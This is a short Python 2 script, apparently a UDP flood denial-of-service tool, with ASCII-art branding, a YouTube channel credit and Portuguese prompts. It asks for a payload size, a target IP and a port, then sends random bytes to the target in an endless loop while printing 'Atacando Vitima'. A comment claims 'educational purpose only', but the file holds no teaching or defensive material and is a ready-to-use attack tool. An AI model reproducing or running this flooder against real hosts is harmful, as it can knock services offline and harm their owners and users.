import sys
import os
import random
import socket
from sys import platform

#Color
B = '\003[1m'



########################################
########################################
# Educational purpose only             #
########################################
# I'm not responsible for your actions #
########################################
########################################




"""
Created By: TheTechHacker
==========================
SUBSCRIBE: https://www.youtube.com/channel/UCKAmv8p_TRvUNrJlfiB8qBQ

"""



if platform == "linux" or platform == "linux2":
    os.system("clear")
elif platform == "darwin":
    os.system("clear")
    print "This Script Works Best on Kali linux"
elif platform == "win32":
    os.system("cls")
else:
    print "\033[1;34m [-]Unknown System Detected \033[1;m"

print "\033[1;32m"

connect = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
print """
:::::::-.       ...      .::::::. 
 ;;,   `';,  .;;;;;;;.  ;;;`    ` 
 `[[     [[, [[     \[[,'[==/[[[[,
  $$,    $$$ $$,     $$$  '''    $
  888_,o8P'" 888,_ _,88P 88b    dP
  MMMMP"`     "YMMMMMP"   "YMmMY"
     _____________________________________
    | Criado por: TheTechHacker          |
    |traducao & personalizacao: 5195#5195|
    |Bytes maximo: 65500                 |
    |____________________________________|"""            



try:
    size = input("bytes~$")
    attack = random._urandom(size)
    ip = raw_input("IP~$")
    port = input("porta~$")
    print " "
    print "Enviando Dados"
    print " "
except SyntaxError:
    print " "
    exit("\033[1;34m ERRO \033[1;m")
except NameError:
    print " "
    exit("\033[1;34m Esta Faltando algo! \033[1;m")
except KeyboardInterrupt:
    print " "
    exit("\033[1;34m [-]Cancelado Pelo usuario \033[1;m")
except ImportError:
    print " "
    exit("\033[1;34m [-]Instale python 2.7.15")


while True:
    try:
        connect.sendto(attack, (ip, port))
        print "Atacando Vitima~$"
    except KeyboardInterrupt:
        print " "
        exit("\033[1;34m [-]Cancelado por usuario \033[1;m")
    except ImportError:
        print " "
        exit("\033[1;34m [-]Instale python 2.7.15")